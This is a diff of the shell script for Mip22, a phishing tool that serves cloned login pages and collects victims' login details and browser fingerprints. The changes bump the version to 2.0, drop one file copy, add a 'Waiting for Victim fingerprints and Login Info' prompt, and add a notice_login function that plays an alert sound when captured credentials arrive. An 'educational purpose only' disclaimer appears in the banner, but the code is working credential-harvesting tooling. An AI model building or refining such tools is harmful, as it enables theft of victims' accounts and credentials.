@@ -160,7 +160,7 @@ ${BLUE}  ██║██║╚██╔╝██║██╔═══╝ ██�
 ${BLUE}  ██║██║ ╚═╝ ██║██║     ╚██████╔╝███████║███████║██║██████╔╝███████╗███████╗███████║   dP   dP
 ${BLUE}  ═╝╚═╝     ╚═╝╚═╝      ╚═════╝ ╚══════╝╚══════╝╚═╝╚═════╝ ╚══════╝╚══════╝╚══════╝   d888 d888 
 ${BLUE}                                                                                         
-        ${CYAN}Mip22 tool made for educational purpose only. 	${ORANGE}Version: 1.0  
+        ${CYAN}Mip22 tool made for educational purpose only. 	${ORANGE}Version: 2.0  
         ${CYAN}The author is not responsible for any malicious use of the program.
 		${CYAN}        Mip Created by ${ORANGE}makdosx ${CYAN}(https://github.com/makdosx) ${WHITE}
 	
@@ -197,7 +197,6 @@ setup_clone_manual() {
    
    cp -rf .manual_attack/index.html .www
    cp -rf .manual_attack/post.php .www
-   cp -rf .manual_attack/data.txt .www
    cp -rf .manual_attack/__ROOT__/index.php .www
    cp -rf .manual_attack/__ROOT__/fingerprints.php .www	
    
@@ -283,6 +282,7 @@ credentials() {
 		if [[ -e ".www/data.txt" ]]; then
 			echo -e "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Login info Found !"
 			get_creds
+			notice_login
 			rm -rf .www/data.txt
 		fi
 		
@@ -297,6 +297,8 @@ credentials() {
 # Print credentials from victim manual
 credentials_manual() {
 	
+  echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Waiting for Victim fingerprints and Login Info.. ${BLUE}Ctrl + C ${MAGENTA}to exit..."
+	
    while true; do	
    
        if [[ -e ".www/fingerprints.txt" ]]; then
@@ -310,6 +312,7 @@ credentials_manual() {
 		if [[ -e ".www/data.txt" ]]; then
 			echo -e "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Login info Found !"
 			get_creds_manual
+			notice_login
 			rm -rf .www/data.txt
 		fi
 		
@@ -766,6 +769,17 @@ play_music() {
 	
 
 
+}
+
+
+
+notice_login()
+{
+xterm -e nohup mpv .notifications/find_login.mp3 > /dev/null 2>&1
+sleep 3
+xterm -e nohup mpv .notifications/find_login.mp3 > /dev/null 2>&1
+sleep 3
+xterm -e nohup mpv .notifications/find_login.mp3 > /dev/null 2>&1
 }
 
 
@@ -1347,6 +1361,7 @@ control_c()
 
 
 trap control_c SIGINT
+
 
 
 check_os_and_install_packages
